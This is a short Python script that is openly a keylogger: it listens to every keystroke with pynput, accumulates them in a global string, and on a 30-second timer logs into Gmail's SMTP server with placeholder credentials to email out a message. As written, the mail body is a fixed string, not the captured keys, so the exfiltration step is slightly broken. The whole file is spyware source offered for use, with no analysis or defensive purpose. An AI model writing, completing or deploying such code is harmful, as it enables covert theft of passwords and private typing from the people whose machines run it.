import pynput.keyboard as pk
import smtplib 
import threading
keyy =''
def send_mail():
    global keyy
    emai_server = smtplib.SMTP("smtp.gmail.com",587)
    emai_server.starttls()
    emai_server.login("your email","your password ")
    emai_server.sendmail("your email","Receivers email","subject body")
    emai_server.quit()
def callprint(key):
    global keyy
    try:
        
        keyy = keyy + str(key.char)
    except AttributeError:
        if key == key.space:
            keyy=keyy+' '
        else:
            keyy = keyy +str(key)
    # print(keyy)

def threadfun():
    global keyy
    send_mail()
    keyy = ''
    thdobj = threading.Timer(30,threadfun)
    thdobj.start()


keylogger_key = pk.Listener(on_press=callprint)

with keylogger_key:
    threadfun()
    keylogger_key.join()
